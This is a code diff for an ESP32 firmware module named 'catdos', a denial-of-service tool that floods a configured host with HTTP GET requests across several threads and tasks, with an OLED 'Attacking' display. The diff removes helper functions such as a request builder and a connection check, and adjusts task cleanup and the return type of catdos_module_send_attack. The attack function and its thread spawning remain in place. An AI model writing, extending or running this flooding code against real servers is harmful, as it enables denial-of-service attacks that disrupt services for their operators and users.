@@ -51,39 +51,14 @@ app_screen_state_information_t app_screen_state_information = {
     .app_selected = 0,
 };
 static bool running_attack = false;
-static TaskHandle_t task_display_attacking = NULL;
 static bool catdos_module_is_config_wifi();
 static bool catdos_module_is_config_target();
 static void catdos_module_display_target_configured();
-static void catdos_module_display_target_configure();
 static void catdos_module_display_wifi_configured();
-static char catdos_module_get_request_url();
-static bool catdos_module_is_connection();
 static void catdos_module_state_machine(uint8_t button_name,
                                         uint8_t button_event);
-static void catdos_module_display_attack_animation();
 static void catdos_module_display_wifi();
 static void catdos_module_show_target();
-
-static void catdos_module_display_attack_animation() {
-  oled_screen_clear(OLED_DISPLAY_NORMAL);
-  while (running_attack) {
-    for (int i = 0; i < 4; i++) {
-      oled_screen_clear(OLED_DISPLAY_NORMAL);
-      oled_screen_display_text_center("Attacking", 0, OLED_DISPLAY_NORMAL);
-      vTaskDelay(250 / portTICK_PERIOD_MS);
-    }
-    vTaskDelay(1000 / portTICK_PERIOD_MS);
-  }
-}
-
-static void catdos_module_display_target_configure() {
-  oled_screen_clear(OLED_DISPLAY_NORMAL);
-  oled_screen_display_text_center("CATDOS", 0, OLED_DISPLAY_NORMAL);
-  oled_screen_display_text_center("Configure", 1, OLED_DISPLAY_NORMAL);
-  oled_screen_display_text_center("Target", 2, OLED_DISPLAY_NORMAL);
-  oled_screen_display_text_center("Use Serial COM", 3, OLED_DISPLAY_NORMAL);
-}
 
 static void catdos_module_display_target_configured() {
   oled_screen_clear(OLED_DISPLAY_NORMAL);
@@ -116,30 +91,6 @@ static void catdos_module_display_wifi_configured() {
     oled_screen_display_text_center("Target", 2, OLED_DISPLAY_NORMAL);
     oled_screen_display_text_center("Use Serial COM", 3, OLED_DISPLAY_NORMAL);
   }
-}
-
-static char catdos_module_get_request_url() {
-  char host[32];
-  char port[32];
-  char endpoint[32];
-  esp_err_t err = preferences_get_string("host", host, 32);
-  if (err != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting host");
-    return NULL;
-  }
-  err = preferences_get_string("port", port, 32);
-  if (err != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting port");
-    return NULL;
-  }
-  err = preferences_get_string("endpoint", endpoint, 32);
-  if (err != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
-    return NULL;
-  }
-  char* request = (char*) malloc(128);
-  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);
-  return request;
 }
 
 void catdos_module_set_target(char* host, char* port, char* endpoint) {
@@ -228,79 +179,6 @@ static bool catdos_module_is_config_target() {
   return true;
 }
 
-static bool catdos_module_is_connection() {
-  const struct addrinfo hints = {
-      .ai_family = AF_INET,
-      .ai_socktype = SOCK_STREAM,
-  };
-  struct addrinfo* res;
-  struct in_addr* addr;
-  int s, r;
-  char recv_buf[64];
-  char host[32];
-  char port[32];
-  char endpoint[32];
-  esp_err_t err_pref = preferences_get_string("host", host, 32);
-  if (err_pref != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting host");
-    return false;
-  }
-  err_pref = preferences_get_string("port", port, 32);
-  if (err_pref != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting port");
-    return false;
-  }
-
-  err_pref = preferences_get_string("endpoint", endpoint, 32);
-  if (err_pref != ESP_OK) {
-    ESP_LOGE(CATDOS_TAG, "Error getting endpoint");
-    return false;
-  }
-
-  int err = getaddrinfo(host, port, &hints, &res);
-
-  if (err != 0 || res == NULL) {
-    ESP_LOGE(CATDOS_TAG, "DNS lookup failed err=%d res=%p", err, res);
-    vTaskDelay(1000 / portTICK_PERIOD_MS);
-    return false;
-  }
-  addr = &((struct sockaddr_in*) res->ai_addr)->sin_addr;
-  // inet_ntoa(*addr));
-
-  s = socket(res->ai_family, res->ai_socktype, 0);
-  if (s < 0) {
-    ESP_LOGE(CATDOS_TAG, "... Failed to allocate socket.");
-    freeaddrinfo(res);
-    vTaskDelay(1000 / portTICK_PERIOD_MS);
-    return false;
-  }
-  // ESP_LOGI(CATDOS_TAG, "... allocated socket");
-
-  if (connect(s, res->ai_addr, res->ai_addrlen) != 0) {
-    ESP_LOGE(CATDOS_TAG, "... socket connect failed errno=%d", errno);
-    close(s);
-    freeaddrinfo(res);
-    vTaskDelay(4000 / portTICK_PERIOD_MS);
-    return false;
-  }
-
-  freeaddrinfo(res);
-
-  char* request = (char*) malloc(128);
-  sprintf(request, "GET %s HTTP/1.0\r\nHost: %s:%s\r\n", endpoint, host, port);
-
-  if (write(s, request, strlen(request)) < 0) {
-    ESP_LOGE(CATDOS_TAG, "... socket send failed");
-    close(s);
-    vTaskDelay(400 / portTICK_PERIOD_MS);
-    return false;
-  }
-  // ESP_LOGI(CATDOS_TAG, "[%d] Task", task_number);
-  // ESP_LOGI(CATDOS_TAG, "... socket send success");
-  close(s);
-  return true;
-}
-
 static void http_get_task(void* pvParameters) {
   const struct addrinfo hints = {
       .ai_family = AF_INET,
@@ -308,8 +186,7 @@ static void http_get_task(void* pvParameters) {
   };
   struct addrinfo* res;
   struct in_addr* addr;
-  int s, r;
-  char recv_buf[64];
+  int s;
   char host[32];
   char port[32];
   char endpoint[32];
@@ -382,11 +259,12 @@ static void http_get_task(void* pvParameters) {
   running_attack = false;
   if (task_atack) {
     vTaskSuspend(task_atack);
-    vTaskDelete(task_atack);
+    
   }
+  vTaskDelete(NULL);
 }
 
-void catdos_module_send_attack() {
+int catdos_module_send_attack() {
   ESP_LOGI(CATDOS_TAG, "Sending attack");
   xTaskCreate(&http_get_task, "http_get_task", 4096, NULL, 5, &task_atack);
 
@@ -432,6 +310,8 @@ void catdos_module_send_attack() {
   assert(res == 0);
   res = pthread_join(thread8, NULL);
   assert(res == 0);
+
+  return 0;
 }
 
 void catdos_module_begin() {
